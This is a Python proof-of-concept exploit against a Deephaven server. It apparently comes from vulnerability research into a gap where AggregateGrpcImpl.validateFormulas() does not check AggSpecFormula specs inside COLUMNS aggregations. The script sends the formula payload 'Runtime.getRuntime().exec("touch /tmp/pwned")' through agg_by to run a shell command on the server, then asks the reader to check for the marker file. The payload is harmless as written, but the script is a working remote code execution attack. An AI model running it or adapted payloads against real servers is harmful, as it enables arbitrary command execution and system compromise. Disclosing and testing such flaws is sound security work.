"""
PoC for Gap 2: AggregateGrpcImpl — AggregationColumns with AggSpecFormula not validated.

AggregateGrpcImpl.validateFormulas() only checks 'countWhere' and 'formula' aggregation
types. When the aggregation type is COLUMNS and its spec is AggSpecFormula, the formula
string passes through unvalidated.

Preconditions:
  - A Deephaven server running on localhost:10000
  - A table "t" exists in the global scope (e.g. t = emptyTable(1).update("I = i"))
"""

from pydeephaven import Session
from pydeephaven.agg import formula


def main():
    session = Session(host="localhost", port=10000)
    try:
        t = session.open_table("t")
        print(f"Opened table 't', size={t.size}")

        # formula() with formula_param returns an _AggregationColumns with AggSpecFormula.
        # validateFormulas() in AggregateGrpcImpl only checks hasCountWhere()
        # and hasFormula() — it never inspects the spec inside COLUMNS.
        payload = 'Runtime.getRuntime().exec("touch /tmp/pwned")'
        agg = formula(formula=payload, formula_param="garbage", cols="I")

        try:
            result = t.agg_by(aggs=[agg], by=["I"])
            print(f"agg_by succeeded, result size={result.size}")
        except Exception as e:
            print(f"agg_by failed: {e}")

        print()
        print("Check: does /tmp/pwned exist on the server?")
        print("  ls -la /tmp/pwned")
    finally:
        session.close()


if __name__ == "__main__":
    main()

